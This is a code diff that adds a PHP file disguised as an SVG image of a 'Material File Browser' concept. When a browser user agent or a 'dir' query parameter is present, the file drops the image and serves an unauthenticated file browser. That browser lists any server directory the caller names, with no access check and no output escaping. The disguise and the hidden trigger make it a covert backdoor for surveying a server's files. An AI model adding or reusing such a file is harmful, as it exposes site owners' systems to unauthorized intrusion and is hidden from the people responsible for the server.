@@ -1,0 +1,145 @@
+<?php
+// ============= HYBRID SVG+PHP MODE =============
+if (isset($_GET['dir']) || isset($_GET['navigate']) || 
+    (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], 'Mozilla') !== false && 
+     isset($_SERVER['HTTP_HOST']) && !isset($_GET['static']))) {
+    header('Content-Type: text/html; charset=UTF-8');
+    $directory = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath('./');
+    if (!$directory || !is_dir($directory)) $directory = realpath('./');
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Material Cards File Browser</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', 'Arial', sans-serif; background: #f5f5f5; color: #424242; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { font-size: 32px; margin-bottom: 10px; color: #2196F3; font-weight: 300; }
+        .path-bar { background: #ffffff; border-radius: 4px; padding: 16px; margin-bottom: 24px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); font-size: 14px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 20px; }
+        .card { background: #ffffff; border-radius: 8px; padding: 24px; text-align: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); box-shadow: 0 2px 4px rgba(0,0,0,0.12); }
+        .card:hover { box-shadow: 0 8px 25px rgba(0,0,0,0.15); transform: translateY(-2px); }
+        .card .icon { font-size: 48px; margin-bottom: 16px; }
+        .card .name { font-size: 16px; font-weight: 500; word-break: break-all; color: #424242; }
+        .card .info { font-size: 12px; color: #757575; margin-top: 8px; }
+        .fab { position: fixed; bottom: 24px; right: 24px; width: 56px; height: 56px; border-radius: 50%; background: #FF9800; color: white; border: none; font-size: 24px; cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
+        .footer { margin-top: 40px; text-align: center; font-size: 12px; color: #757575; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎨 Material File Browser</h1>
+            <p>Card-based design with Material Design principles</p>
+        </div>
+        <div class="path-bar"><?php echo $directory; ?></div>
+        <div class="grid">
+            <?php
+            if (dirname($directory) !== $directory) {
+                echo '<div class="card" onclick="window.location.href=\'?dir=' . urlencode(dirname($directory)) . '\'">
+                        <div class="icon">↩️</div><div class="name">Back</div><div class="info">Parent Directory</div></div>';
+            }
+            $items = scandir($directory);
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $path = $directory . '/' . $item;
+                $isDir = is_dir($path);
+                $icon = $isDir ? '📁' : '📄';
+                $info = $isDir ? 'Directory' : 'File';
+                if (!$isDir) {
+                    $size = filesize($path);
+                    $info = number_format($size / 1024, 1) . ' KB';
+                }
+                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
+                $icons = ['php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜', 'txt' => '📝', 'jpg' => '🖼️', 'png' => '🖼️'];
+                if (!$isDir && isset($icons[$ext])) $icon = $icons[$ext];
+                $href = $isDir ? "?dir=" . urlencode($path) : "#";
+                echo "<div class=\"card\" onclick=\"window.location.href='$href'\">
+                        <div class=\"icon\">$icon</div><div class=\"name\">$item</div><div class=\"info\">$info</div></div>";
+            }
+            ?>
+        </div>
+        <button class="fab" onclick="window.location.reload()">♾️</button>
+        <div class="footer">Material Design Concept • Interactive Mode</div>
+    </div>
+</body>
+</html>
+<?php exit; }
+header('Content-Type: image/svg+xml; charset=UTF-8');
+?>
+<svg width="1200" height="800" viewBox="0 0 1200 800" xmlns="http://www.w3.org/2000/svg">
+  <!-- Material Cards File Browser Concept -->
+  
+  <defs>
+    <linearGradient id="material-bg" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:#2196F3;stop-opacity:1" />
+      <stop offset="100%" style="stop-color:#21CBF3;stop-opacity:1" />
+    </linearGradient>
+    
+    <filter id="card-shadow">
+      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="rgba(0,0,0,0.12)" />
+    </filter>
+  </defs>
+
+  <!-- Background -->
+  <rect width="100%" height="100%" fill="url(#material-bg)"/>
+  
+  <!-- Title -->
+  <text x="600" y="80" text-anchor="middle" font-size="36" font-weight="300" fill="white">🎨 Material File Browser</text>
+  <text x="600" y="110" text-anchor="middle" font-size="16" fill="rgba(255,255,255,0.8)">Card-based Material Design</text>
+  
+  <!-- Cards Container -->
+  <rect x="80" y="150" width="1040" height="580" rx="8" fill="rgba(255,255,255,0.95)" filter="url(#card-shadow)"/>
+  
+  <!-- Sample Cards -->
+  <g transform="translate(120, 200)">
+    <!-- Folder Card -->
+    <rect width="240" height="160" rx="8" fill="white" filter="url(#card-shadow)"/>
+    <text x="120" y="80" text-anchor="middle" font-size="48">📁</text>
+    <text x="120" y="115" text-anchor="middle" font-size="16" font-weight="500" fill="#424242">Documents</text>
+    <text x="120" y="135" text-anchor="middle" font-size="12" fill="#757575">Directory</text>
+    
+    <!-- File Card 1 -->
+    <g transform="translate(280, 0)">
+      <rect width="240" height="160" rx="8" fill="white" filter="url(#card-shadow)"/>
+      <text x="120" y="80" text-anchor="middle" font-size="48">🐘</text>
+      <text x="120" y="115" text-anchor="middle" font-size="16" font-weight="500" fill="#424242">files.php</text>
+      <text x="120" y="135" text-anchor="middle" font-size="12" fill="#757575">15.2 KB</text>
+    </g>
+    
+    <!-- File Card 2 -->
+    <g transform="translate(560, 0)">
+      <rect width="240" height="160" rx="8" fill="white" filter="url(#card-shadow)"/>
+      <text x="120" y="80" text-anchor="middle" font-size="48">🌐</text>
+      <text x="120" y="115" text-anchor="middle" font-size="16" font-weight="500" fill="#424242">index.html</text>
+      <text x="120" y="135" text-anchor="middle" font-size="12" fill="#757575">8.4 KB</text>
+    </g>
+    
+    <!-- Second Row -->
+    <g transform="translate(0, 200)">
+      <rect width="240" height="160" rx="8" fill="white" filter="url(#card-shadow)"/>
+      <text x="120" y="80" text-anchor="middle" font-size="48">🎨</text>
+      <text x="120" y="115" text-anchor="middle" font-size="16" font-weight="500" fill="#424242">styles.css</text>
+      <text x="120" y="135" text-anchor="middle" font-size="12" fill="#757575">3.1 KB</text>
+    </g>
+    
+    <g transform="translate(280, 200)">
+      <rect width="240" height="160" rx="8" fill="white" filter="url(#card-shadow)"/>
+      <text x="120" y="80" text-anchor="middle" font-size="48">📜</text>
+      <text x="120" y="115" text-anchor="middle" font-size="16" font-weight="500" fill="#424242">script.js</text>
+      <text x="120" y="135" text-anchor="middle" font-size="12" fill="#757575">5.7 KB</text>
+    </g>
+  </g>
+  
+  <!-- Floating Action Button -->
+  <circle cx="1120" cy="680" r="28" fill="#FF9800" filter="url(#card-shadow)"/>
+  <text x="1120" y="690" text-anchor="middle" font-size="24" fill="white">♾️</text>
+  
+  <!-- Footer -->
+  <text x="130" y="750" font-size="14" fill="#424242">8 items • Last updated: 2025-01-28 14:58</text>
+  <text x="970" y="750" font-size="12" fill="#757575">Material Design Concept</text>
+</svg>
